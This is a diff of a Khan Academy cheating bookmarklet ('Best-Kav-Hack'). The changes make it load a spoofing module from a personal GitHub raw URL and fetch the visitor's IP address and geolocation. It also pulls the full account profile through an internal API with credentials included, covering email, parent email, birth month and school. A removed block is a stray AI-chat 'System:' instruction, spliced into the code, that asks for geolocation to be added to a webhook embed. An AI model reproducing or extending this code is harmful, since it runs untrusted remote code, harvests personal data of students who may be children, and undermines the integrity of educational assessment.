@@ -76,22 +76,7 @@ async function showSplashScreen() {
     `;
     splashScreen.innerHTML = `
         <img src="https://i.imgur.com/JDt99XK.jpeg" style="width: 100px; height: 100px; border-radius: 50%; margin-bottom: 20px;">
-        <span style="font-size: 30px; font-weight: 7
-System: The conversation was interrupted before you could finish your response. The user has now provided the full script again and reiterated their request to avoid modifying the previous obfuscation or code scrambling idea. Instead, they want to add geolocation information (city, region, country) to the webhook based on the user's IP address.
-
-Here’s how to proceed:
-- **Incorporate the new request**: Add geolocation information (city, region, country) to the webhook using an API like `ipapi.co`, as you started to outline.
-- **Preserve the original script**: Keep the script’s structure and logic intact, only adding the GeoIP fetch and updating the webhook embed.
-- **Avoid obfuscation or scrambling**: Do not apply any code scrambling or obfuscation, as the user has explicitly moved away from that idea.
-- **Leverage past context**: Subtly draw on the user’s preference for clean, functional code and visually appealing webhook embeds (e.g., from previous requests for “ngầu” Discord embeds).
-- **Complete the response**: Provide the full updated script within the `<xaiArtifact>` tag, ensuring it’s testable and runs smoothly via bookmarklet.
-- **Address potential issues**: Include notes on testing, API limits, and webhook security (e.g., hardcoding the webhook URL), as you’ve done before.
-
-Below is the continuation and completion of your response, integrating the GeoIP feature into the script.
-
----
-
-00;">Powered By Hiếu Dz</span>
+        <span style="font-size: 30px; font-weight: 700;">Powered By Hiếu Dz</span>
         <span style="font-size: 24px; color: #facc15;">Best-Kav-Hack</span>
     `;
     document.body.appendChild(splashScreen);
@@ -154,7 +139,7 @@ function setupMenu() {
 
 /* Main Functions */ 
 function setupMain(){
-    loadScript(repoPath+'functions/questionSpoof.js', 'questionSpoof');
+    loadScript('https://raw.githubusercontent.com/HieuDz997/vatchatbian/refs/heads/main/questionSpoof.js', 'questionSpoof');
     loadScript(repoPath+'functions/videoSpoof.js', 'videoSpoof');
     loadScript(repoPath+'functions/minuteFarm.js', 'minuteFarm');
     loadScript(repoPath+'functions/spoofUser.js', 'spoofUser');
@@ -165,22 +150,12 @@ function setupMain(){
 }
 
 /* Inject */
-if (!/^https?:\/\/([a-z0-9-]+\.)?khanacademy\.org/.test(window.location.href)) { 
-    alert("❌ Không Thể Inject!\n\nVui lòng không dung HieuDz Kav Hack trên web khác! (https://pt.khanacademy.org/)"); 
-    window.location.href = "https://pt.khanacademy.org/"; 
-}
+if (!/^https?:\/\/([a-z0-9-]+\.)?khanacademy\.org/.test(window.location.href)) { alert("❌ Không Thể Inject!\n\nVui lòng không dung HieuDz Kav Hack trên web khác! (https://pt.khanacademy.org/)"); window.location.href = "https://pt.khanacademy.org/"; }
 
 showSplashScreen();
 
-loadScript('https://raw.githubusercontent.com/adryd325/oneko.js/refs/heads/main/oneko.js', 'onekoJs').then(() => { 
-    onekoEl = document.getElementById('oneko'); 
-    onekoEl.style.backgroundImage = "url('https://raw.githubusercontent.com/adryd325/oneko.js/main/oneko.gif')"; 
-    onekoEl.style.display = "none"; 
-});
-loadScript('https://cdn.jsdelivr.net/npm/darkreader@4.9.92/darkreader.min.js', 'darkReaderPlugin').then(() => { 
-    DarkReader.setFetchMethod(window.fetch); 
-    DarkReader.enable(); 
-});
+loadScript('https://raw.githubusercontent.com/adryd325/oneko.js/refs/heads/main/oneko.js', 'onekoJs').then(() => { onekoEl = document.getElementById('oneko'); onekoEl.style.backgroundImage = "url('https://raw.githubusercontent.com/adryd325/oneko.js/main/oneko.gif')"; onekoEl.style.display = "none"; });
+loadScript('https://cdn.jsdelivr.net/npm/darkreader@4.9.92/darkreader.min.js', 'darkReaderPlugin').then(()=>{ DarkReader.setFetchMethod(window.fetch); DarkReader.enable(); })
 loadCss('https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css', 'toastifyCss');
 loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
 .then(async () => {
@@ -189,12 +164,11 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
     localStorage.setItem('kavHackUsageCount', usageCount);
     let deviceId = localStorage.getItem('kavHackDeviceId');
     if (!deviceId) {
-        deviceId = ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c => 
-            (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
+        deviceId = ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c => (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
         localStorage.setItem('kavHackDeviceId', deviceId);
     }
 
-    // Fetch IP address
+    // Fetch IP address and GeoIP
     let ipAddress = 'Unknown';
     let geoInfo = { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
     try {
@@ -202,41 +176,47 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
         const ipData = await ipResponse.json();
         ipAddress = ipData.ip;
 
-        // Fetch GeoIP info
-        const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
-        const geoData = await geoResponse.json();
-        geoInfo = {
-            city: geoData.city || 'Unknown',
-            region: geoData.region || 'Unknown',
-            country: geoData.country_name || 'Unknown'
-        };
+        // Fetch GeoIP separately to avoid blocking
+        try {
+            const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}`);
+            const geoData = await geoResponse.json();
+            if (geoData.status !== 'fail') {
+                geoInfo = {
+                    city: geoData.city || 'Unknown',
+                    region: geoData.regionName || 'Unknown',
+                    country: geoData.country || 'Unknown'
+                };
+            }
+        } catch (geoError) {
+            debug('Failed to fetch GeoIP: ' + geoError.message);
+        }
     } catch (error) {
-        debug('Failed to fetch IP or GeoIP: ' + error.message);
+        debug('Failed to fetch IP: ' + error.message);
     }
 
     // Fetch user profile
     let classInfo = { classes: 'None', teachers: 'None' };
-    await fetch(`https://${window.location.hostname}/api/internal/graphql/getFullUserProfile`, {
-        headers: {
-            accept: "*/*",
-            "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-            "content-type": "application/json",
-            priority: "u=1, i",
-            "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "sec-gpc": "1",
-            "x-ka-fkey": "1"
+    await fetch(`https://${window.location.hostname}/api/internal/graphql/getFullUserProfile`,{
+        headers:{
+            accept:"*/*",
+            "accept-language":"pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+            "content-type":"application/json",
+            priority:"u=1, i",
+            "sec-ch-ua":'"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
+            "sec-ch-ua-mobile":"?0",
+            "sec-ch-ua-platform":'"Windows"',
+            "sec-fetch-dest":"empty",
+            "sec-fetch-mode":"cors",
+            "sec-fetch-site":"same-origin",
+            "sec-gpc":"1",
+            "x-ka-fkey":"1"
         },
-        referrer: "https://pt.khanacademy.org/profile/me/teacher/kaid_589810246138844031185299/class/6245691961556992",
-        referrerPolicy: "strict-origin-when-cross-origin",
-        body: '{"operationName":"getFullUserProfile","variables":{},"query":"query getFullUserProfile($kaid: String, $username: String) {\\n  user(kaid: $kaid, username: $username) {\\n    id\\n    kaid\\n    key\\n    userId\\n    email\\n    username\\n    profileRoot\\n    gaUserId\\n    isPhantom\\n    isDeveloper: hasPermission(name: \\"can_do_what_only_admins_can_do\\")\\n    isPublisher: hasPermission(name: \\"can_publish\\", scope: ANY_ON_CURRENT_LOCALE)\\n    isModerator: hasPermission(name: \\"can_moderate_users\\", scope: GLOBAL)\\n    isParent\\n    isTeacher\\n    isFormalTeacher\\n    isK4dStudent\\n    isKmapStudent\\n    isDataCollectible\\n    isChild\\n    isOrphan\\n    isCoachingLoggedInUser\\n    canModifyCoaches\\n    nickname\\n    hideVisual\\n    joined\\n    points\\n    countVideosCompleted\\n    bio\\n    profile {\\n      accessLevel\\n      __typename\\n    }\\n    soundOn\\n    muteVideos\\n    showCaptions\\n    prefersReducedMotion\\n    noColorInVideos\\n    newNotificationCount\\n    canHellban: hasPermission(name: \\"can_ban_users\\", scope: GLOBAL)\\n    canMessageUsers: hasPermission(\\n      name: \\"can_send_moderator_messages\\"\\n      scope: GLOBAL\\n    )\\n    isSelf: isActor\\n    hasStudents: hasCoachees\\n    hasClasses\\n    hasChildren\\n    hasCoach\\n    badgeCounts\\n    homepageUrl\\n    isMidsignupPhantom\\n    includesDistrictOwnedData\\n    includesKmapDistrictOwnedData\\n    includesK4dDistrictOwnedData\\n    canAccessDistrictsHomepage\\n    underAgeGate {\\n      parentEmail\\n      daysUntilCutoff\\n      approvalGivenAt\\n      __typename\\n    }\\n    authEmails\\n    signupDataIfUnverified {\\n      email\\n      emailBounced\\n      __typename\\n    }\\n    pendingEmailVerifications {\\n      email\\n      __typename\\n    }\\n    hasAccessToAIGuideCompanionMode\\n    hasAccessToAIGuideLearner\\n    hasAccessToAIGuideDistrictAdmin\\n    hasAccessToAIGuideParent\\n    hasAccessToAIGuideTeacher\\n    tosAccepted\\n    shouldShowAgeCheck\\n    birthMonthYear\\n    lastLoginCountry\\n    region\\n    userDistrictInfos {\\n      id\\n      isKAD\\n    district {\\n        id\\n        region\\n        __typename\\n      }\\n      __typename\\n    }\\n    schoolAffiliation {\\n      id\\n      location\\n      __typename\\n    }\\n    __typename\\n  }\\n  actorIsImpersonatingUser\\n  isAIGuideEnabled\\n  hasAccessToAIGuideDev\\n}"}',
-        method: "POST",
-        mode: "cors",
-        credentials: "include"
+        referrer:"https://pt.khanacademy.org/profile/me/teacher/kaid_589810246138844031185299/class/6245691961556992",
+        referrerPolicy:"strict-origin-when-cross-origin",
+        body:'{"operationName":"getFullUserProfile","variables":{},"query":"query getFullUserProfile($kaid: String, $username: String) {\\n  user(kaid: $kaid, username: $username) {\\n    id\\n    kaid\\n    key\\n    userId\\n    email\\n    username\\n    profileRoot\\n    gaUserId\\n    isPhantom\\n    isDeveloper: hasPermission(name: \\"can_do_what_only_admins_can_do\\")\\n    isPublisher: hasPermission(name: \\"can_publish\\", scope: ANY_ON_CURRENT_LOCALE)\\n    isModerator: hasPermission(name: \\"can_moderate_users\\", scope: GLOBAL)\\n    isParent\\n    isTeacher\\n    isFormalTeacher\\n    isK4dStudent\\n    isKmapStudent\\n    isDataCollectible\\n    isChild\\n    isOrphan\\n    isCoachingLoggedInUser\\n    canModifyCoaches\\n    nickname\\n    hideVisual\\n    joined\\n    points\\n    countVideosCompleted\\n    bio\\n    profile {\\n      accessLevel\\n      __typename\\n    }\\n    soundOn\\n    muteVideos\\n    showCaptions\\n    prefersReducedMotion\\n    noColorInVideos\\n    newNotificationCount\\n    canHellban: hasPermission(name: \\"can_ban_users\\", scope: GLOBAL)\\n    canMessageUsers: hasPermission(\\n      name: \\"can_send_moderator_messages\\"\\n      scope: GLOBAL\\n    )\\n    isSelf: isActor\\n    hasStudents: hasCoachees\\n    hasClasses\\n    hasChildren\\n    hasCoach\\n    badgeCounts\\n    homepageUrl\\n    isMidsignupPhantom\\n    includesDistrictOwnedData\\n    includesKmapDistrictOwnedData\\n    includesK4dDistrictOwnedData\\n    canAccessDistrictsHomepage\\n    underAgeGate {\\n      parentEmail\\n      daysUntilCutoff\\n      approvalGivenAt\\n      __typename\\n    }\\n    authEmails\\n    signupDataIfUnverified {\\n      email\\n      emailBounced\\n      __typename\\n    }\\n    pendingEmailVerifications {\\n      email\\n      __typename\\n    }\\n    hasAccessToAIGuideCompanionMode\\n    hasAccessToAIGuideLearner\\n    hasAccessToAIGuideDistrictAdmin\\n    hasAccessToAIGuideParent\\n    hasAccessToAIGuideTeacher\\n    tosAccepted\\n    shouldShowAgeCheck\\n    birthMonthYear\\n    lastLoginCountry\\n    region\\n    userDistrictInfos {\\n      id\\n      isKAD\\n      district {\\n        id\\n        region\\n        __typename\\n      }\\n      __typename\\n    }\\n    schoolAffiliation {\\n      id\\n      location\\n      __typename\\n    }\\n    __typename\\n  }\\n  actorIsImpersonatingUser\\n  isAIGuideEnabled\\n  hasAccessToAIGuideDev\\n}"}',
+        method:"POST",
+        mode:"cors",
+        credentials:"include"
     })
     .then(async response => { 
         let data = await response.json(); 
@@ -295,12 +275,9 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
     await delay(500);
     
     sendToast(`⭐ KhanHack By HieuDz Xin Chào Bạn : ${user.nickname}`);
-    if(device.apple) { 
-        await delay(500); 
-        sendToast(`🪽 Thế còn việc mua một chiếc Samsung thì sao?`); 
-    }
+    if(device.apple) { await delay(500); sendToast(`🪽 Thế còn việc mua một chiếc Samsung thì sao?`); }
     
-    loadedPlugins.forEach(plugin => sendToast(`🪝 ${plugin} Loaded!`, 2000, 'top'));
+    loadedPlugins.forEach(plugin => sendToast(`🪝 ${plugin} Loaded!`, 2000, 'top') );
     
     hideSplashScreen();
     setupMenu();
